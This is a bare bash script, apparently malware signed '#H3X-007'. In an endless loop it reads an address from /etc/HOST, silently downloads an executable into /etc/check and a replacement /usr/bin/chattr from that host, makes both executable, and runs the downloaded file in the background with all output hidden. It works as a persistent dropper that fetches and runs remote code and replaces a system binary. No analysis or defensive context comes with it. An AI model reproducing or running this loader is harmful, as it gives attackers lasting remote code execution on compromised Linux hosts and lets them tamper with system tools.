#!/bin/bash
#H3X-007 :)

script_path="/etc/check"

ip_address=$(head -n 1 "/etc/HOST")

while true; do
    if [ ! -f "$script_path" ]; then
        wget "http://$ip_address/check" -O "$script_path" >/dev/null 2>&1
        chmod +x "$script_path"
    else
        cp "$script_path" "/tmp/check" >/dev/null 2>&1
        wget "http://$ip_address/check" -O "$script_path" >/dev/null 2>&1
        chmod +x "$script_path"
        cp "/tmp/check" "$script_path" >/dev/null 2>&1
        rm "/tmp/check" >/dev/null 2>&1
    fi

    chattr_path="/usr/bin/chattr"

    if [ ! -f "$chattr_path" ]; then
        wget "http://$ip_address/chattr" -O "$chattr_path" >/dev/null 2>&1
        chmod +x "$chattr_path"
    else
        cp "$chattr_path" "/tmp/chattr" >/dev/null 2>&1
        wget "http://$ip_address/chattr" -O "$chattr_path" >/dev/null 2>&1
        chmod +x "$chattr_path"
        cp "/tmp/chattr" "$chattr_path" >/dev/null 2>&1
        rm "/tmp/chattr" >/dev/null 2>&1
    fi

    nohup "$script_path" >/dev/null 2>&1 &

    sleep 1
done
